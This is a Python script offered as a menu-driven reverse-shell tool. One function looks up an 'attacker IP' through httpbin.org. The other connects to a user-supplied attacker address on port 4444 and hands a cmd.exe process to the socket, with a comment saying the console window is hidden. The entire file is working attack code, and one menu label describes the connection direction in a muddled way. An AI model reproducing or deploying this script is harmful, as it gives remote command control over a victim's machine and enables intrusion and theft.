import requests
import socket
import subprocess
import os

def get_attacker_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        response.raise_for_status()  # Raises a HTTPError if the status is 4xx, 5xx
        json_response = response.json()
        print(f"The attacker's IP is: {json_response['origin']}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def reverse_shell():
    HOST = input("Enter the attacker's IP address: ")  # User inputs the attacker's IP address
    PORT = 4444  # The listening port on the attacker's machine

    print(f"Connecting back to {HOST} on port {PORT}...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((HOST, PORT))

        # Windows-specific method to hide the console window that pops up
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        process = subprocess.Popen(['cmd.exe'], stdin=s, stdout=s, stderr=s, startupinfo=startupinfo)
        process.communicate()
    except Exception as e:
        print(f"Connection failed: {e}")

def main_menu():
    while True:  # This loop will keep the menu running
        print("\nMain Menu")
        print("1. Get Local/Attacker IP Address")
        print("2. Initiate Reverse Shell to Victim")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            get_attacker_ip()
        elif choice == '2':
            reverse_shell()
        elif choice == '3':
            print("Exiting...")
            break  # Exit the loop to end the program
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")

if __name__ == '__main__':
    main_menu()
